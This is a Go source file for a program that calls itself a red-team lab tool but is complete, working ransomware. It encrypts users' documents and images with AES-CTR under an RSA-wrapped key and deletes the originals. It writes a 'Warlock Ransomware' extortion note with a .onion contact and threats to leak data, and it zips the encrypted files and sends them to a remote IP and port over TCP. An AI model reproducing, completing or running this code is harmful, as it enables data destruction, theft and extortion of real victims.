package main

import (
	"archive/zip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"net"
	"os"
	"path/filepath"
	"strings"
)

const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQB6+I7q5b5HqpKJ4MfD/oU5
JyLQU9ZQ8x1fZKdn7cU2JvkvL5MT38ZROlDQibbE1OXHPPUcDxu8aB3CmWcmDDWi
3z9q1pRk4FtfFdPt4amy5nyRTXjg16dSsEAhvyqL9M63UE52vaWDmxZ4CrKsjj78
yJMUCnsVMCuuE3JOcMytzbgoCmR2kPtaluPwcc9Bzc6wGIXw+Dd+OfG7+2I0Jver
LdS3yPYXk4swsKhlxDrtECgLxiLiZ4D0HqNS1dFZVDd4VjngjXbQillcBYNc/xyy
yNzLZMj0035VOIISse1h41KIPUA8XipAyXLPEdUGoV/ci877zWOeWGDwmuJyrIeN
AgMBAAE=
-----END PUBLIC KEY-----`

var fileExts = []string{".txt", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg", ".png"}
var skipDirs = []string{
	`C:\Windows`,
	`C:\Program Files`,
	`C:\ProgramData`,
	`C:\Users\Default`,
	`C:\System Volume Information`,
}

func shouldSkip(path string) bool {
	for _, skip := range skipDirs {
		if strings.HasPrefix(strings.ToLower(path), strings.ToLower(skip)) {
			return true
		}
	}
	return false
}

func silentMainWrap() {

	defer func() {
		if r := recover(); r != nil {

			os.Exit(1)
		}
	}()
}

func main() {
	silentMainWrap()

	defer func() {
		if r := recover(); r != nil {
			safeError("internal error occurred; operation aborted")
		}
	}()

	mode := flag.String("m", "", "Mode: encrypt, decrypt-key, decrypt-files")
	root := flag.String("d", "", "Target directory")
	privKeyPath := flag.String("k", "", "RSA private key file path")
	ip := flag.String("i", "", "IP address")
	port := flag.String("p", "", "Port")
	help := flag.Bool("h", false, "Show help")

	flag.Parse()

	if *help || *mode == "help" {
		fmt.Println(`Warlock Utility - Red Team Lab Tool

	Usage:
	warlock.exe -m <mode> [options]

	Modes:
	encrypt         Encrypt files in a target directory using AES
	decrypt-key     Decrypt the AES key using your RSA private key
	decrypt-files   Decrypt previously encrypted files using the restored AES key

	Options:
	-m            Operation mode: encrypt, decrypt-key, decrypt-files (required)
	-d            Path to the target directory (required for encrypt and decrypt-files)
	-k            Path to RSA private key file (required for decrypt-key)
	-i            IP address to send the encrypted zip file to 
	-p            Port number for exfiltration
	-h            Show this help message

	Examples:
	warlock.exe -m encrypt -d "C:\Users\User1\Desktop" -i 192.168.1.10 -p 4444
	warlock.exe -m decrypt-key -k "C:\Users\User1\Desktop\priv_key.txt"
	warlock.exe -m decrypt-files -d "C:\Users\User1\Desktop"

	Notes:
	- Encrypted files will have the extension .x2anylock
	- AES key is saved to Desktop as YOUR_KEY.txt
	- System directories like C:\Windows and C:\Program Files are automatically skipped
	`)
		os.Exit(0)
	}

	if *mode != "decrypt-key" && *root == "" {
		fmt.Println("Error: -d is required for this mode")
		os.Exit(1)
	}

	switch *mode {
	case "encrypt":
		absRoot, err := filepath.Abs(*root)
		if err != nil {
			panic(err)
		}
		fmt.Println("[*] Target Directory:", absRoot)

		key := generateAESKey()
		saveEncryptedKey(key)
		copyKeyToTarget(absRoot)
		cryptSystem(absRoot, key, true)
		dropRansomNote()

		zipPath := filepath.Join(os.TempDir(), "exfiltrated.zip")
		if err := zipDirectory(absRoot, zipPath); err != nil {
			fmt.Println("[-] Failed to zip encrypted directory:", err)
		} else {
			fmt.Println("[+] Encrypted directory zipped:", zipPath)
			if *ip != "" && *port != "" {
				if err := sendZipToRemote(zipPath, *ip, *port); err != nil {
					fmt.Println("[-] Failed to exfiltrate zip:", err)
				} else {
					fmt.Println("[+] Zip exfiltrated successfully")
				}
			}
		}

	case "decrypt-key":
		if *privKeyPath == "" {
			fmt.Println("Error: -k is required for decrypt-key mode")
			os.Exit(1)
		}
		decryptKey(*privKeyPath)

	case "decrypt-files":
		absRoot, err := filepath.Abs(*root)
		if err != nil {
			panic(err)
		}
		fmt.Println("[*] Target Directory:", absRoot)
		key := loadDecryptedKey()
		cryptSystem(absRoot, key, false)

	default:
		fmt.Println("Invalid mode. Use encrypt, decrypt-key, or decrypt-files")
	}
}

func safeError(msg string, details ...interface{}) {
	if len(details) == 0 {
		fmt.Printf("[ERROR] %s\n", msg)
		return
	}
	fmt.Printf("[ERROR] %s: ", msg)
	fmt.Printf(strings.Repeat("%v ", len(details))+"\n", details...)
}

func sendZipToRemote(zipPath, ip, port string) error {
	data, err := os.ReadFile(zipPath)
	if err != nil {
		return err
	}
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		return err
	}
	defer conn.Close()
	_, err = conn.Write(data)
	return err
}

func copyKeyToTarget(targetDir string) {
	desktop := getWindowsDesktopPath()
	src := filepath.Join(desktop, "YOUR_KEY.txt")
	dst := filepath.Join(targetDir, "YOUR_KEY.txt")
	data, err := os.ReadFile(src)
	if err != nil {
		fmt.Println("[-] Failed to copy YOUR_KEY.txt to target:", err)
		return
	}
	err = os.WriteFile(dst, data, 0600)
	if err != nil {
		fmt.Println("[-] Failed to write YOUR_KEY.txt to target:", err)
	}
}

func getWindowsDesktopPath() string {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		panic("USERPROFILE not set — cannot locate desktop")
	}
	return filepath.Join(userProfile, "Desktop")
}

func generateAESKey() []byte {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		panic(err)
	}
	return key
}

func saveEncryptedKey(key []byte) {
	block, _ := pem.Decode([]byte(publicKeyPEM))
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		panic(err)
	}
	rsaPub := pub.(*rsa.PublicKey)
	encKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPub, key, nil)
	if err != nil {
		panic(err)
	}
	desktop := getWindowsDesktopPath()
	err = os.WriteFile(filepath.Join(desktop, "YOUR_KEY.txt"), encKey, 0600)
	if err != nil {
		panic(err)
	}
	fmt.Println("[+] Encrypted AES key saved to desktop")
}

func decryptKey(privPath string) {
	desktop := getWindowsDesktopPath()
	encPath := filepath.Join(desktop, "YOUR_KEY.txt")
	if _, err := os.Stat(encPath); os.IsNotExist(err) {
		encPath += ".x2anylock"
	}
	encKey, err := os.ReadFile(encPath)
	if err != nil {
		panic(err)
	}
	privPEM, err := os.ReadFile(privPath)
	if err != nil {
		panic(fmt.Errorf("failed to read private key file: %w", err))
	}
	block, _ := pem.Decode(privPEM)
	if block == nil {
		panic("invalid PEM format in private key")
	}
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		panic(err)
	}
	key, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, encKey, nil)
	if err != nil {
		panic(err)
	}
	err = os.WriteFile(filepath.Join(desktop, "YOUR_KEY.txt"), key, 0600)
	if err != nil {
		panic(err)
	}
	if encPath != filepath.Join(desktop, "YOUR_KEY.txt") {
		os.Remove(encPath)
	}
	fmt.Println("[+] AES key decrypted and restored to desktop")
}

func loadDecryptedKey() []byte {
	desktop := getWindowsDesktopPath()
	key, err := os.ReadFile(filepath.Join(desktop, "YOUR_KEY.txt"))
	if err != nil {
		panic(err)
	}
	return key
}

func cryptSystem(root string, key []byte, encrypt bool) {
	if shouldSkip(root) {
		fmt.Println("SKIPPED (system directory):", root)
		return
	}
	filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if shouldSkip(path) {
			fmt.Println("SKIPPED (system directory):", path)
			return nil
		}
		absPath, err := filepath.Abs(path)
		if err != nil || !strings.HasPrefix(absPath, root) {
			return nil
		}
		name := strings.ToLower(filepath.Base(path))
		ext := strings.ToLower(filepath.Ext(path))
		if name == "your_key.txt" || name == "readme.txt" {
			fmt.Println("SKIPPED (protected):", path)
			return nil
		}
		if (!contains(fileExts, ext) && !strings.HasSuffix(name, ".x2anylock")) || strings.HasSuffix(name, ".pem") {
			return nil
		}
		if encrypt {
			encryptFile(path, key)
		} else {
			decryptFile(path, key)
		}
		return nil
	})
}

func encryptFile(path string, key []byte) {
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	encData, err := aesEncrypt(data, key)
	if err != nil {
		return
	}
	newPath := path + ".x2anylock"
	err = os.WriteFile(newPath, encData, 0600)
	if err == nil {
		os.Remove(path)
	}
}

func decryptFile(path string, key []byte) {
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	decData, err := aesDecrypt(data, key)
	if err != nil {
		return
	}
	origPath := strings.TrimSuffix(path, ".x2anylock")
	err = os.WriteFile(origPath, decData, 0600)
	if err == nil {
		os.Remove(path)
	}
}

func aesEncrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	iv := make([]byte, aes.BlockSize)
	_, err = rand.Read(iv)
	if err != nil {
		return nil, err
	}
	stream := cipher.NewCTR(block, iv)
	buf := make([]byte, len(data))
	stream.XORKeyStream(buf, data)
	return append(iv, buf...), nil
}

func aesDecrypt(data []byte, key []byte) ([]byte, error) {
	if len(data) < aes.BlockSize {
		return nil, errors.New("invalid data")
	}
	iv := data[:aes.BlockSize]
	data = data[aes.BlockSize:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	stream := cipher.NewCTR(block, iv)
	buf := make([]byte, len(data))
	stream.XORKeyStream(buf, data)
	return buf, nil
}

func dropRansomNote() {
	desktop := getWindowsDesktopPath()
	note := `==================== WARLOCK RANSOMWARE ====================
We are [Warlock Group], a professional hack organization. Your critical data has been encrypted.
We have securely backed up portions of your data to ensure the quality of our services.

====> What Happened?
Your systems have been locked using advanced encryption. You cannot access critical files. We hold the decryption key.

====> If You Choose to Pay:
- Swift recovery with full data restoration
- Permanent deletion of backed-up data
- Professional support and confidentiality

====> If You Refuse to Pay:
- Permanent data loss
- Public exposure of sensitive data
- Ongoing attacks and reputational damage

====> How to Contact Us?
Dark Web: http://zshjpmblsjcbkdsifjklskdifujfdhffvsafacddfdsfdzd.onion/t0uchOs.html
Chat Key: warlock-7f3a2b1c
Decrypt ID: X2A-9482-DFQ1

Backup Contact: qTox ID: 842E99B9EC4BCFE16080AFCFD6FNJKJKGKGKGKGK7E85DB318F7B3440982637FC2847F71685DOOOORFD

Please use the Tor browser to access our site. We are available 24/7. Your data, reputation, and public image are at stake.
============================================================`
	err := os.WriteFile(filepath.Join(desktop, "README.txt"), []byte(note), 0600)
	if err != nil {
		fmt.Println("Failed to drop ransom note:", err)
	} else {
		fmt.Println("Dropped ransom note")
	}
}

func contains(list []string, item string) bool {
	for _, v := range list {
		if strings.HasSuffix(item, v) {
			return true
		}
	}
	return false
}

func zipDirectory(sourceDir, zipPath string) error {
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return err
	}
	defer zipFile.Close()

	archive := zip.NewWriter(zipFile)
	defer archive.Close()

	err = filepath.Walk(sourceDir, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Skip directories
		if info.IsDir() {
			return nil
		}

		name := strings.ToLower(info.Name())
		if !strings.HasSuffix(name, ".x2anylock") && name != "your_key.txt" {
			return nil
		}

		relPath, err := filepath.Rel(sourceDir, path)
		if err != nil {
			return err
		}
		relPath = filepath.ToSlash(relPath) //Ensure forward slashes for zip format

		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		header.Name = relPath
		header.Method = zip.Deflate

		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}
		_, err = io.Copy(writer, file)
		return err
	})
	return err
}
